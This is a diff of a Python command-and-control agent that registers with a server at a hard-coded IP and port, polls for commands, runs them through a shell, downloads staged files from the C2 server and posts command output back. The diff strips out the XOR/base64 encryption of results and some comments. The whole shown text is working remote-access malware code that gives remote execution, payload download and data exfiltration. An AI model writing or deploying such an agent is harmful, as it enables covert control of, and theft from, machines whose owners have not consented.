@@ -1,23 +1,13 @@
-import subprocess, time, uuid, socket, requests, platform, base64, locale
+import subprocess, time, uuid, socket, requests, platform
 
-SERVER_HOST = "192.168.1.69"  
-SERVER_PORT = 6655            
+SERVER_HOST = "192.168.1.69"
+SERVER_PORT = 6655
 SERVER_URL  = f"http://{SERVER_HOST}:{SERVER_PORT}"
-CRYPTO_KEY  = "supersecret"   
 
 hostname = socket.gethostname()
 mac = uuid.getnode()
 AGENT_ID = f"Agent-{hostname}"
 os_info = platform.system()
-
-def xor(data: str, key=CRYPTO_KEY) -> str:
-    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
-
-def encrypt(data: str, key=CRYPTO_KEY) -> str:
-    return base64.b64encode(xor(data, key).encode()).decode()
-
-def decrypt(data: str, key=CRYPTO_KEY) -> str:
-    return xor(base64.b64decode(data.encode()).decode(), key)
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -65,53 +55,40 @@ def beacon_command(commands):
             except ValueError:
                 output = "[!] Invalid fetch command format. Use: fetch <filename> <dest_path>"
 
-        # Handle regular commands
         else:
             output = execute_command(command_text)
 
-        # Send result back to server
         try:
             requests.post(
                 f"{SERVER_URL}/result",
-                json={
-                    "command_id": cmd_id,
-                    "result": encrypt(output)
-                },
+                json={"command_id": cmd_id, "result": output},
                 timeout=10
             )
         except Exception as e:
             print(f"[!] Failed to send result: {e}")
 
 def fetch_file(filename, dest_path):
-    """
-    Fetch a staged file from the C2 server (/files/<filename>)
-    and save it locally on the agent machine.
-    """
     try:
         url = f"{SERVER_URL}/files/{filename}"
         r = requests.get(url, timeout=15)
-
         if r.status_code == 200:
             with open(dest_path, "wb") as f:
                 f.write(r.content)
-            return f"[+] File {filename} fetched and saved to {dest_path}"
+            return f"[+] File {filename} saved to {dest_path}"
         else:
             return f"[!] Failed to fetch {filename}: HTTP {r.status_code}"
-
     except Exception as e:
         return f"[!] Fetch error: {e}"
-    
+
 def execute_command(command):
     try:
         result = subprocess.check_output(
-            command,
-            shell=True,                   # Use default shell (cmd.exe on Windows, /bin/sh on Linux/Mac)
-            stderr=subprocess.STDOUT
+            command, shell=True, stderr=subprocess.STDOUT
         )
         return result.decode("utf-8", errors="ignore").strip()
     except subprocess.CalledProcessError as e:
         return e.output.decode("utf-8", errors="ignore").strip()
-    
+
 if __name__ == "__main__":
     try:
         register_agent()
